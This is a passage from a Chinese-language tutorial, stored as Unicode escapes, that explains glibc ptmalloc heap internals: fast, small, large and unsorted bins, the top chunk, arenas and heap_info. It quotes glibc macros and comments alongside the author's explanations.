\u7684\u4f7f\u7528\u6807\u8bb0\u603b\u662f\u88ab\u7f6e\u4f4d\u7684\uff0c\u6240\u4ee5\u4e0d\u6ee1\u8db3\u4e0a\u9762\u7684\u539f\u5219\u3002 bin \u901a\u7528\u7684\u5b8f\u5982\u4e0b typedef struct malloc_chunk * mbinptr ; /* addressing -- note that bin_at(0) does not exist */ #define bin_at(m, i) \\ (mbinptr)(((char *) &((m)->bins[ ((i) -1) * 2 ])) - \\ offsetof(struct malloc_chunk, fd)) /* analog of ++bin */ //\u83b7\u53d6\u4e0b\u4e00\u4e2abin\u7684\u5730\u5740 #define next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr) << 1))) /* Reminders about list directionality within bins */ // \u8fd9\u4e24\u4e2a\u5b8f\u53ef\u4ee5\u7528\u6765\u904d\u5386bin // \u83b7\u53d6 bin \u7684\u4f4d\u4e8e\u94fe\u8868\u5934\u7684 chunk #define first(b) ((b)->fd) // \u83b7\u53d6 bin \u7684\u4f4d\u4e8e\u94fe\u8868\u5c3e\u7684 chunk #define last(b) ((b)->bk) fast bin \u00b6 \u5927\u591a\u6570\u7a0b\u5e8f\u7ecf\u5e38\u4f1a\u7533\u8bf7\u4ee5\u53ca\u91ca\u653e\u4e00\u4e9b\u6bd4\u8f83\u5c0f\u7684\u5185\u5b58\u5757\u3002\u5982\u679c\u5c06\u4e00\u4e9b\u8f83\u5c0f\u7684 chunk \u91ca\u653e\u4e4b\u540e\u53d1\u73b0\u5b58\u5728\u4e0e\u4e4b\u76f8\u90bb\u7684\u7a7a\u95f2\u7684 chunk \u5e76\u5c06\u5b83\u4eec\u8fdb\u884c\u5408\u5e76\uff0c\u90a3\u4e48\u5f53\u4e0b\u4e00\u6b21\u518d\u6b21\u7533\u8bf7\u76f8\u5e94\u5927\u5c0f\u7684 chunk \u65f6\uff0c\u5c31\u9700\u8981\u5bf9 chunk \u8fdb\u884c\u5206\u5272\uff0c\u8fd9\u6837\u5c31\u5927\u5927\u964d\u4f4e\u4e86\u5806\u7684\u5229\u7528\u6548\u7387\u3002 \u56e0\u4e3a\u6211\u4eec\u628a\u5927\u90e8\u5206\u65f6\u95f4\u82b1\u5728\u4e86\u5408\u5e76\u3001\u5206\u5272\u4ee5\u53ca\u4e2d\u95f4\u68c0\u67e5\u7684\u8fc7\u7a0b\u4e2d\u3002 \u56e0\u6b64\uff0cptmalloc \u4e2d\u4e13\u95e8\u8bbe\u8ba1\u4e86 fast bin\uff0c\u5bf9\u5e94\u7684\u53d8\u91cf\u5c31\u662f malloc state \u4e2d\u7684 fastbinsY /* Fastbins An array of lists holding recently freed small chunks. Fastbins are not doubly linked. It is faster to single-link them, and since chunks are never removed from the middles of these lists, double linking is not necessary. Also, unlike regular bins, they are not even processed in FIFO order (they use faster LIFO) since ordering doesn't much matter in the transient contexts in which fastbins are normally used. Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */ typedef struct malloc_chunk * mfastbinptr ; /* This is in malloc_state. /* Fastbins */ mfastbinptr fastbinsY [ NFASTBINS ]; */ \u4e3a\u4e86\u66f4\u52a0\u9ad8\u6548\u5730\u5229\u7528 fast bin\uff0cglibc \u91c7\u7528\u5355\u5411\u94fe\u8868\u5bf9\u5176\u4e2d\u7684\u6bcf\u4e2a bin \u8fdb\u884c\u7ec4\u7ec7\uff0c\u5e76\u4e14 \u6bcf\u4e2a bin \u91c7\u53d6 LIFO \u7b56\u7565 \uff0c\u6700\u8fd1\u91ca\u653e\u7684 chunk \u4f1a\u66f4\u65e9\u5730\u88ab\u5206\u914d\uff0c\u6240\u4ee5\u4f1a\u66f4\u52a0\u9002\u5408\u4e8e\u5c40\u90e8\u6027\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u7528\u6237\u9700\u8981\u7684 chunk \u7684\u5927\u5c0f\u5c0f\u4e8e fastbin \u7684\u6700\u5927\u5927\u5c0f\u65f6\uff0c ptmalloc \u4f1a\u9996\u5148\u5224\u65ad fastbin \u4e2d\u76f8\u5e94\u7684 bin \u4e2d\u662f\u5426\u6709\u5bf9\u5e94\u5927\u5c0f\u7684\u7a7a\u95f2\u5757\uff0c\u5982\u679c\u6709\u7684\u8bdd\uff0c\u5c31\u4f1a\u76f4\u63a5\u4ece\u8fd9\u4e2a bin \u4e2d\u83b7\u53d6 chunk\u3002\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0cptmalloc\u624d\u4f1a\u505a\u63a5\u4e0b\u6765\u7684\u4e00\u7cfb\u5217\u64cd\u4f5c\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff08 32\u4f4d\u7cfb\u7edf\u4e3a\u4f8b \uff09\uff0c fastbin \u4e2d\u9ed8\u8ba4\u652f\u6301\u6700\u5927\u7684 chunk \u7684\u6570\u636e\u7a7a\u95f4\u5927\u5c0f\u4e3a 64 \u5b57\u8282\u3002\u4f46\u662f\u5176\u53ef\u4ee5\u652f\u6301\u7684chunk\u7684\u6570\u636e\u7a7a\u95f4\u6700\u5927\u4e3a80\u5b57\u8282\u3002\u9664\u6b64\u4e4b\u5916\uff0c fastbin \u6700\u591a\u53ef\u4ee5\u652f\u6301\u7684 bin \u7684\u4e2a\u6570\u4e3a 10 \u4e2a\uff0c\u4ece\u6570\u636e\u7a7a\u95f4\u4e3a8\u5b57\u8282\u5f00\u59cb\u4e00\u76f4\u523080\u5b57\u8282\uff0c\u5b9a\u4e49\u5982\u4e0b #define NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1) #ifndef DEFAULT_MXFAST #define DEFAULT_MXFAST (64 * SIZE_SZ / 4) #endif /* The maximum fastbin request size we support */ #define MAX_FAST_SIZE (80 * SIZE_SZ / 4) /* Since the lowest 2 bits in max_fast don't matter in size comparisons, they are used as flags. */ /* FASTCHUNKS_BIT held in max_fast indicates that there are probably some fastbin chunks. It is set true on entering a chunk into any fastbin, and cleared only in malloc_consolidate. The truth value is inverted so that have_fastchunks will be true upon startup (since statics are zero-filled), simplifying initialization checks. */ //\u5224\u65ad\u5206\u914d\u533a\u662f\u5426\u6709 fast bin chunk\uff0c1\u8868\u793a\u6ca1\u6709 #define FASTCHUNKS_BIT (1U) #define have_fastchunks(M) (((M)->flags & FASTCHUNKS_BIT) == 0) #define clear_fastchunks(M) catomic_or(&(M)->flags, FASTCHUNKS_BIT) #define set_fastchunks(M) catomic_and(&(M)->flags, ~FASTCHUNKS_BIT) /* NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous regions. Otherwise, contiguity is exploited in merging together, when possible, results from consecutive MORECORE calls. The initial value comes from MORECORE_CONTIGUOUS, but is changed dynamically if mmap is ever used as an sbrk substitute. */ // MORECODE\u662f\u5426\u8fd4\u56de\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u3002 // \u4e3b\u5206\u914d\u533a\u4e2d\u7684MORECORE\u5176\u5b9e\u4e3asbr()\uff0c\u9ed8\u8ba4\u8fd4\u56de\u8fde\u7eed\u865a\u62df\u5730\u5740\u7a7a\u95f4 // \u975e\u4e3b\u5206\u914d\u533a\u4f7f\u7528mmap()\u5206\u914d\u5927\u5757\u865a\u62df\u5185\u5b58\uff0c\u7136\u540e\u8fdb\u884c\u5207\u5206\u6765\u6a21\u62df\u4e3b\u5206\u914d\u533a\u7684\u884c\u4e3a // \u800c\u9ed8\u8ba4\u60c5\u51b5\u4e0bmmap\u6620\u5c04\u533a\u57df\u662f\u4e0d\u4fdd\u8bc1\u865a\u62df\u5730\u5740\u7a7a\u95f4\u8fde\u7eed\u7684\uff0c\u6240\u4ee5\u975e\u4e3b\u5206\u914d\u533a\u9ed8\u8ba4\u5206\u914d\u975e\u8fde\u7eed\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002 #define NONCONTIGUOUS_BIT (2U) #define contiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) == 0) #define noncontiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) != 0) #define set_noncontiguous(M) ((M)->flags |= NONCONTIGUOUS_BIT) #define set_contiguous(M) ((M)->flags &= ~NONCONTIGUOUS_BIT) /* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the arena. Such an arena is no longer used to allocate chunks. Chunks allocated in that arena before detecting corruption are not freed. */ #define ARENA_CORRUPTION_BIT (4U) #define arena_is_corrupt(A) (((A)->flags & ARENA_CORRUPTION_BIT)) #define set_arena_corrupt(A) ((A)->flags |= ARENA_CORRUPTION_BIT) /* Set value of max_fast. Use impossibly small value if 0. Precondition: there are no existing fastbin chunks. Setting the value clears fastchunk bit but preserves noncontiguous bit. */ #define set_max_fast(s) \\ global_max_fast = \\ (((s) == 0) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) & ~MALLOC_ALIGN_MASK)) #define get_max_fast() global_max_fast ptmalloc \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f1a\u8c03\u7528 set_max_fast(s) \u5c06\u5168\u5c40\u53d8\u91cf global_max_fast \u8bbe\u7f6e\u4e3a DEFAULT_MXFAST\uff0c\u4e5f\u5c31\u662f\u8bbe\u7f6e fast bins \u4e2d chunk \u7684\u6700\u5927\u503c\u3002\u5f53 MAX_FAST_SIZE \u88ab\u8bbe\u7f6e\u4e3a 0 \u65f6\uff0c\u7cfb\u7edf\u5c31\u4e0d\u4f1a\u652f\u6301 fastbin \u3002 fastbin\u7684\u7d22\u5f15 #define fastbin(ar_ptr, idx) ((ar_ptr)->fastbinsY[ idx ]) /* offset 2 to use otherwise unindexable first 2 bins */ // chunk size=2*size_sz*(2+idx) // \u8fd9\u91cc\u8981\u51cf2\uff0c\u5426\u5219\u7684\u8bdd\uff0c\u524d\u4e24\u4e2abin\u6ca1\u6709\u529e\u6cd5\u7d22\u5f15\u5230\u3002 #define fastbin_index(sz) \\ ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2) \u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0cfastbin \u8303\u56f4\u7684 chunk \u7684 inuse \u59cb\u7ec8\u88ab\u7f6e\u4e3a 1\u3002\u56e0\u6b64\u5b83\u4eec\u4e0d\u4f1a\u548c\u5176\u5b83\u88ab\u91ca\u653e\u7684chunk\u5408\u5e76\u3002 \u4f46\u662f\u5f53\u91ca\u653e\u7684 chunk \u4e0e\u8be5 chunk \u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u5408\u5e76\u540e\u7684\u5927\u5c0f\u5927\u4e8eFASTBIN_CONSOLIDATION_THRESHOLD\u65f6\uff0c\u5185\u5b58\u788e\u7247\u53ef\u80fd\u6bd4\u8f83\u591a\u4e86\uff0c\u6211\u4eec\u5c31\u9700\u8981\u628a fast bins \u4e2d\u7684chunk\u90fd\u8fdb\u884c\u5408\u5e76\uff0c\u4ee5\u51cf\u5c11\u5185\u5b58\u788e\u7247\u5bf9\u7cfb\u7edf\u7684\u5f71\u54cd\u3002 /* FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free() that triggers automatic consolidation of possibly-surrounding fastbin chunks. This is a heuristic, so the exact value should not matter too much. It is defined at half the default trim threshold as a compromise heuristic to only attempt consolidation if it is likely to lead to trimming. However, it is not dynamically tunable, since consolidation reduces fragmentation surrounding large chunks even if trimming is not used. */ #define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL) malloc_consolidate\u51fd\u6570\u53ef\u4ee5\u5c06fastbin\u4e2d\u6240\u6709\u7684chunk\u91ca\u653e\u5e76\u5408\u5e76\u5728\u4e00\u8d77\u3002\uff1f\uff1f\uff1f /* Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */ small bin \u00b6 small bins \u4e2d\u6bcf\u4e2a chunk \u7684\u5927\u5c0f\u4e0e\u5176\u6240\u5728\u7684 bin \u7684 index \u7684\u5173\u7cfb\u4e3a\uff1achunk_size =2 * SIZE_SZ *index\uff0c\u5177\u4f53\u5982\u4e0b \u4e0b\u6807 SIZE_SZ=4\uff0832\u4f4d\uff09 SIZE_SZ=8\uff0864\u4f4d\uff09 2 16 32 3 24 48 4 32 64 5 40 80 x 2*4*x 2*8*x 63 504 1008 small bins \u4e2d\u4e00\u5171\u6709 62 \u4e2a\u94fe\u8868\uff0c\u6bcf\u4e2a\u94fe\u8868\u4e2d\u5b58\u50a8\u7684 chunk \u5927\u5c0f\u90fd\u4e00\u81f4\u3002\u6bd4\u5982\u5bf9\u4e8e 32 \u4f4d\u7cfb\u7edf\u6765\u8bf4\uff0c\u4e0b\u6807 2 \u5bf9\u5e94\u7684\u53cc\u5411\u94fe\u8868\u4e2d\u5b58\u50a8\u7684 chunk \u5927\u5c0f\u4e3a\u5747\u4e3a 16 \u5b57\u8282\u3002\u6bcf\u4e2a\u94fe\u8868\u90fd\u6709\u94fe\u8868\u5934\u7ed3\u70b9\uff0c\u8fd9\u6837\u53ef\u4ee5\u65b9\u4fbf\u5bf9\u4e8e\u94fe\u8868\u5185\u90e8\u7ed3\u70b9\u7684\u7ba1\u7406\u3002\u6b64\u5916\uff0c small bins \u4e2d\u6bcf\u4e2a bin \u5bf9\u5e94\u7684\u94fe\u8868\u91c7\u7528 FIFO \u7684\u89c4\u5219 \uff0c\u6240\u4ee5\u540c\u4e00\u4e2a\u94fe\u8868\u4e2d\u5148\u88ab\u91ca\u653e\u7684 chunk \u4f1a\u5148\u88ab\u5206\u914d\u51fa\u53bb\u3002 small bin\u76f8\u5173\u7684\u5b8f\u5982\u4e0b #define NSMALLBINS 64 #define SMALLBIN_WIDTH MALLOC_ALIGNMENT // \u662f\u5426\u9700\u8981\u5bf9small bin\u7684\u4e0b\u6807\u8fdb\u884c\u7ea0\u6b63 #define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT > 2 * SIZE_SZ) #define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH) //\u5224\u65adchunk\u7684\u5927\u5c0f\u662f\u5426\u5728small bin\u8303\u56f4\u5185 #define in_smallbin_range(sz) \\ ((unsigned long) (sz) < (unsigned long) MIN_LARGE_SIZE) // \u6839\u636echunk\u7684\u5927\u5c0f\u5f97\u5230small bin\u5bf9\u5e94\u7684\u7d22\u5f15\u3002 #define smallbin_index(sz) \\ ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) >> 4) \\ : (((unsigned) (sz)) >> 3)) + \\ SMALLBIN_CORRECTION) \u6216\u8bb8\uff0c\u5927\u5bb6\u4f1a\u5f88\u7591\u60d1\uff0c\u90a3 fastbin \u4e0e small bin \u4e2d chunk \u7684\u5927\u5c0f\u4f1a\u6709\u5f88\u5927\u4e00\u90e8\u5206\u91cd\u5408\u554a\uff0c\u90a3 small bin \u4e2d\u5bf9\u5e94\u5927\u5c0f\u7684 bin \u662f\u4e0d\u662f\u5c31\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\u554a\uff1f \u5176\u5b9e\u4e0d\u7136\uff0cfast bin \u4e2d\u7684 chunk \u662f\u6709\u53ef\u80fd\u88ab\u653e\u5230 small bin\u4e2d\u53bb\u7684\u3002 large bin \u00b6 large bins \u4e2d\u4e00\u5171\u5305\u62ec 63 \u4e2a bin\uff0c\u6bcf\u4e2a bin \u4e2d\u7684 chunk \u7684\u5927\u5c0f\u4e0d\u4e00\u81f4\uff0c\u800c\u662f\u5904\u4e8e\u4e00\u5b9a\u533a\u95f4\u8303\u56f4\u5185\u3002\u6b64\u5916\uff0c\u8fd9 63 \u4e2a bin \u88ab\u5206\u6210\u4e86 6 \u7ec4\uff0c\u6bcf\u7ec4 bin \u4e2d\u7684 chunk \u5927\u5c0f\u4e4b\u95f4\u7684\u516c\u5dee\u4e00\u81f4\uff0c\u5177\u4f53\u5982\u4e0b\uff1a \u7ec4 \u6570\u91cf \u516c\u5dee 1 32 64B 2 16 512B 3 8 4096B 4 4 32768B 5 2 262144B 6 1 \u4e0d\u9650\u5236 \u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u5e73\u53f0\u7684 large bin \u4e3a\u4f8b\uff0c\u7b2c\u4e00\u4e2a large bin \u7684\u8d77\u59cb chunk \u5927\u5c0f\u4e3a 512 \u5b57\u8282\uff0c\u4f4d\u4e8e\u7b2c\u4e00\u7ec4\uff0c\u6240\u4ee5\u8be5bin \u53ef\u4ee5\u5b58\u50a8\u7684 chunk \u7684\u5927\u5c0f\u8303\u56f4\u4e3a [512,512+64)\u3002 \u5173\u4e8e large bin \u7684\u5b8f\u5982\u4e0b\uff0c\u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u5e73\u53f0\u4e0b\uff0c\u7b2c\u4e00\u4e2a large bin \u7684\u8d77\u59cb chunk \u5927\u5c0f\u4e3a\u4f8b\uff0c\u4e3a 512 \u5b57\u8282\uff0c\u90a3\u4e48 512>>6 = 8\uff0c\u6240\u4ee5\u5176\u4e0b\u6807\u4e3a56+8=64\u3002 #define largebin_index_32(sz) \\ (((((unsigned long) (sz)) >> 6) <= 38) \\ ? 56 + (((unsigned long) (sz)) >> 6) \\ : ((((unsigned long) (sz)) >> 9) <= 20) \\ ? 91 + (((unsigned long) (sz)) >> 9) \\ : ((((unsigned long) (sz)) >> 12) <= 10) \\ ? 110 + (((unsigned long) (sz)) >> 12) \\ : ((((unsigned long) (sz)) >> 15) <= 4) \\ ? 119 + (((unsigned long) (sz)) >> 15) \\ : ((((unsigned long) (sz)) >> 18) <= 2) \\ ? 124 + (((unsigned long) (sz)) >> 18) \\ : 126) #define largebin_index_32_big(sz) \\ (((((unsigned long) (sz)) >> 6) <= 45) \\ ? 49 + (((unsigned long) (sz)) >> 6) \\ : ((((unsigned long) (sz)) >> 9) <= 20) \\ ? 91 + (((unsigned long) (sz)) >> 9) \\ : ((((unsigned long) (sz)) >> 12) <= 10) \\ ? 110 + (((unsigned long) (sz)) >> 12) \\ : ((((unsigned long) (sz)) >> 15) <= 4) \\ ? 119 + (((unsigned long) (sz)) >> 15) \\ : ((((unsigned long) (sz)) >> 18) <= 2) \\ ? 124 + (((unsigned long) (sz)) >> 18) \\ : 126) // XXX It remains to be seen whether it is good to keep the widths of // XXX the buckets the same or whether it should be scaled by a factor // XXX of two as well. #define largebin_index_64(sz) \\ (((((unsigned long) (sz)) >> 6) <= 48) \\ ? 48 + (((unsigned long) (sz)) >> 6) \\ : ((((unsigned long) (sz)) >> 9) <= 20) \\ ? 91 + (((unsigned long) (sz)) >> 9) \\ : ((((unsigned long) (sz)) >> 12) <= 10) \\ ? 110 + (((unsigned long) (sz)) >> 12) \\ : ((((unsigned long) (sz)) >> 15) <= 4) \\ ? 119 + (((unsigned long) (sz)) >> 15) \\ : ((((unsigned long) (sz)) >> 18) <= 2) \\ ? 124 + (((unsigned long) (sz)) >> 18) \\ : 126) #define largebin_index(sz) \\ (SIZE_SZ == 8 ? largebin_index_64(sz) : MALLOC_ALIGNMENT == 16 \\ ? largebin_index_32_big(sz) \\ : largebin_index_32(sz)) unsorted bin \u00b6 unsorted bin \u53ef\u4ee5\u89c6\u4e3a\u7a7a\u95f2 chunk \u56de\u5f52\u5176\u6240\u5c5e bin \u4e4b\u524d\u7684\u7f13\u51b2\u533a\u3002 \u5176\u5728 glibc \u4e2d\u5177\u4f53\u7684\u8bf4\u660e\u5982\u4e0b /* Unsorted chunks All remainders from chunk splits, as well as all returned chunks, are first placed in the \"unsorted\" bin. They are then placed in regular bins after malloc gives them ONE chance to be used before binning. So, basically, the unsorted_chunks list acts as a queue, with chunks being placed on it in free (and malloc_consolidate), and taken off (to be either used or placed in bins) in malloc. The NON_MAIN_ARENA flag is never set for unsorted chunks, so it does not have to be taken into account in size comparisons. */ \u4ece\u4e0b\u9762\u7684\u5b8f\u6211\u4eec\u53ef\u4ee5\u770b\u51fa /* The otherwise unindexable 1-bin is used to hold unsorted chunks. */ #define unsorted_chunks(M) (bin_at(M, 1)) unsorted bin \u5904\u4e8e\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\u7684bin\u6570\u7ec4\u4e0b\u68071\u5904\u3002\u6545\u800c unsorted bin\u53ea\u6709\u4e00\u4e2a\u94fe\u8868\u3002unsorted bin \u4e2d\u7684\u7a7a\u95f2 chunk \u5904\u4e8e\u4e71\u5e8f\u72b6\u6001\uff0c\u4e3b\u8981\u6709\u4e24\u4e2a\u6765\u6e90 \u5f53\u4e00\u4e2a\u8f83\u5927\u7684 chunk \u88ab\u5206\u5272\u6210\u4e24\u534a\u540e\uff0c\u5982\u679c\u5269\u4e0b\u7684\u90e8\u5206\u5927\u4e8eMINSIZE\uff0c\u5c31\u4f1a\u88ab\u653e\u5230 unsorted bin \u4e2d\u3002 \u91ca\u653e\u4e00\u4e2a\u4e0d\u5c5e\u4e8e fast bin \u7684 chunk\uff0c\u5e76\u4e14\u8be5 chunk \u4e0d\u548c top chunk \u7d27\u90bb\u65f6\uff0c\u8be5 chunk \u4f1a\u88ab\u9996\u5148\u653e\u5230 unsorted bin \u4e2d\u3002\u5173\u4e8e top chunk \u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u8003\u4e0b\u9762\u7684\u4ecb\u7ecd\u3002 \u6b64\u5916\uff0cUnsorted Bin \u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u91c7\u7528\u7684\u904d\u5386\u987a\u5e8f\u662f FIFO \u3002 common macro \u00b6 \u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e9b\u901a\u7528\u7684\u5b8f\u3002 \u6839\u636echunk\u7684\u5927\u5c0f\u7edf\u4e00\u5730\u83b7\u5f97chunk\u6240\u5728\u7684\u7d22\u5f15 #define bin_index(sz) \\ ((in_smallbin_range(sz)) ? smallbin_index(sz) : largebin_index(sz)) top chunk \u00b6 glibc \u4e2d\u5bf9\u4e8e top chunk \u7684\u63cf\u8ff0\u5982\u4e0b /* Top The top-most available chunk (i.e., the one bordering the end of available memory) is treated specially. It is never included in any bin, is used only if no other chunk is available, and is released back to the system if it is very large (see M_TRIM_THRESHOLD). Because top initially points to its own bin with initial zero size, thus forcing extension on the first malloc request, we avoid having any special code in malloc to check whether it even exists yet. But we still need to do so when getting memory from system, so we make initial_top treat the bin as a legal but unusable chunk during the interval between initialization and the first call to sysmalloc. (This is somewhat delicate, since it relies on the 2 preceding words to be zero during this interval as well.) */ /* Conveniently, the unsorted bin can be used as dummy top on first call */ #define initial_top(M) (unsorted_chunks(M)) \u7a0b\u5e8f\u7b2c\u4e00\u6b21\u8fdb\u884c malloc \u7684\u65f6\u5019\uff0cheap \u4f1a\u88ab\u5206\u4e3a\u4e24\u5757\uff0c\u4e00\u5757\u7ed9\u7528\u6237\uff0c\u5269\u4e0b\u7684\u90a3\u5757\u5c31\u662f top chunk\u3002\u5176\u5b9e\uff0c\u6240\u8c13\u7684top chunk \u5c31\u662f\u5904\u4e8e\u5f53\u524d\u5806\u7684\u7269\u7406\u5730\u5740\u6700\u9ad8\u7684 chunk\u3002\u8fd9\u4e2a chunk \u4e0d\u5c5e\u4e8e\u4efb\u4f55\u4e00\u4e2a bin\uff0c\u5b83\u7684\u4f5c\u7528\u5728\u4e8e\u5f53\u6240\u6709\u7684bin \u90fd\u65e0\u6cd5\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\u65f6\uff0c\u5982\u679c\u5176\u5927\u5c0f\u4e0d\u5c0f\u4e8e\u6307\u5b9a\u7684\u5927\u5c0f\uff0c\u5c31\u8fdb\u884c\u5206\u914d\uff0c\u5e76\u5c06\u5269\u4e0b\u7684\u90e8\u5206\u4f5c\u4e3a\u65b0\u7684 top chunk\u3002\u5426\u5219\uff0c\u5c31\u5bf9heap\u8fdb\u884c\u6269\u5c55\u540e\u518d\u8fdb\u884c\u5206\u914d\u3002\u5728main arena\u4e2d\u901a\u8fc7sbrk\u6269\u5c55heap\uff0c\u800c\u5728thread arena\u4e2d\u901a\u8fc7mmap\u5206\u914d\u65b0\u7684heap\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0ctop chunk \u7684 prev_inuse \u6bd4\u7279\u4f4d\u59cb\u7ec8\u4e3a1\uff0c\u5426\u5219\u5176\u524d\u9762\u7684chunk\u5c31\u4f1a\u88ab\u5408\u5e76\u5230top chunk\u4e2d\u3002 \u521d\u59cb\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06 unsorted chunk \u4f5c\u4e3a top chunk\u3002 last remainder \u00b6 \u5728\u7528\u6237\u4f7f\u7528 malloc \u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0cptmalloc2 \u627e\u5230\u7684 chunk \u53ef\u80fd\u5e76\u4e0d\u548c\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e00\u81f4\uff0c\u8fd9\u65f6\u5019\u5c31\u5c06\u5206\u5272\u4e4b\u540e\u7684\u5269\u4f59\u90e8\u5206\u79f0\u4e4b\u4e3a last remainder chunk \uff0cunsort bin\u4e5f\u4f1a\u5b58\u8fd9\u4e00\u5757\u3002top chunk \u5206\u5272\u5269\u4e0b\u7684\u90e8\u5206\u4e0d\u4f1a\u4f5c\u4e3alast remainer. \u5b8f\u89c2\u7ed3\u6784 \u00b6 arena \u00b6 \u5728\u6211\u4eec\u4e4b\u524d\u4ecb\u7ecd\u7684\u4f8b\u5b50\u4e2d\uff0c\u65e0\u8bba\u662f\u4e3b\u7ebf\u7a0b\u8fd8\u662f\u65b0\u521b\u5efa\u7684\u7ebf\u7a0b\uff0c\u5728\u7b2c\u4e00\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u90fd\u4f1a\u6709\u72ec\u7acb\u7684arena\u3002\u90a3\u4e48\u4f1a\u4e0d\u4f1a\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u6709\u72ec\u7acb\u7684arena\u5462\uff1f\u4e0b\u9762\u6211\u4eec\u5c31\u5177\u4f53\u4ecb\u7ecd\u3002 arena \u6570\u91cf \u00b6 \u5bf9\u4e8e\u4e0d\u540c\u7cfb\u7edf\uff0carena\u6570\u91cf\u7684 \u7ea6\u675f \u5982\u4e0b For 32 bit systems: Number of arena = 2 * number of cores. For 64 bit systems: Number of arena = 8 * number of cores. \u663e\u7136\uff0c\u4e0d\u662f\u6bcf\u4e00\u4e2a\u7ebf\u7a0b\u90fd\u4f1a\u6709\u5bf9\u5e94\u7684 arena\u3002\u81f3\u4e8e\u4e3a\u4ec0\u4e4864\u4f4d\u7cfb\u7edf\uff0c\u8981\u90a3\u4e48\u8bbe\u7f6e\uff0c\u6211\u4e5f\u6ca1\u6709\u60f3\u660e\u767d\u3002\u6b64\u5916\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u7cfb\u7edf\u7684\u6838\u6570\u662f\u6709\u9650\u7684\uff0c\u5f53\u7ebf\u7a0b\u6570\u5927\u4e8e\u6838\u6570\u7684\u4e8c\u500d\uff08\u8d85\u7ebf\u7a0b\u6280\u672f\uff09\u65f6\uff0c\u5c31\u5fc5\u7136\u6709\u7ebf\u7a0b\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\uff0c\u6240\u4ee5\u6ca1\u6709\u5fc5\u8981\u4e3a\u6bcf\u4e2a\u7ebf\u7a0b\u5206\u914d\u4e00\u4e2a arena\u3002 arena \u5206\u914d\u89c4\u5219 \u00b6 \u5f85\u8865\u5145\u3002 \u533a\u522b \u00b6 \u4e0e thread \u4e0d\u540c\u7684\u662f\uff0cmain_arena \u5e76\u4e0d\u5728\u7533\u8bf7\u7684 heap \u4e2d\uff0c\u800c\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5728 libc.so \u7684\u6570\u636e\u6bb5\u3002 heap_info \u00b6 \u7a0b\u5e8f\u521a\u5f00\u59cb\u6267\u884c\u65f6\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u662f\u6ca1\u6709 heap \u533a\u57df\u7684\u3002\u5f53\u5176\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u5c31\u9700\u8981\u4e00\u4e2a\u7ed3\u6784\u6765\u8bb0\u5f55\u5bf9\u5e94\u7684\u4fe1\u606f\uff0c\u800cheap_info \u7684\u4f5c\u7528\u5c31\u662f\u8fd9\u4e2a\u3002\u800c\u4e14\u5f53\u8be5heap\u7684\u8d44\u6e90\u88ab\u4f7f\u7528\u5b8c\u540e\uff0c\u5c31\u5fc5\u987b\u5f97\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u4e86\u3002\u6b64\u5916\uff0c\u4e00\u822c\u7533\u8bf7\u7684heap \u662f\u4e0d\u8fde\u7eed\u7684\uff0c\u56e0\u6b64\u9700\u8981\u8bb0\u5f55\u4e0d\u540cheap\u4e4b\u95f4\u7684\u94fe\u63a5\u7ed3\u6784\u3002 \u8be5\u6570\u636e\u7ed3\u6784\u662f\u4e13\u95e8\u4e3a\u4ece Memory Mapping Segment \u5904\u7533\u8bf7\u7684\u5185\u5b58\u51c6\u5907\u7684\uff0c\u5373\u4e3a\u975e\u4e3b\u7ebf\u7a0b\u51c6\u5907\u7684\u3002 \u4e3b\u7ebf\u7a0b\u53ef\u4ee5\u901a\u8fc7 sbrk() \u51fd\u6570\u6269\u5c55 program break location \u83b7\u5f97\uff08\u76f4\u5230\u89e6\u53caMemory Mapping Segment\uff09\uff0c\u53ea\u6709\u4e00\u4e2aheap\uff0c\u6ca1\u6709 heap_info \u6570\u636e\u7ed3\u6784\u3002 heap_info \u7684\u4e3b\u8981\u7ed3\u6784\u5982\u4e0b #define HEAP_MIN_SIZE (32 * 1024) #ifndef 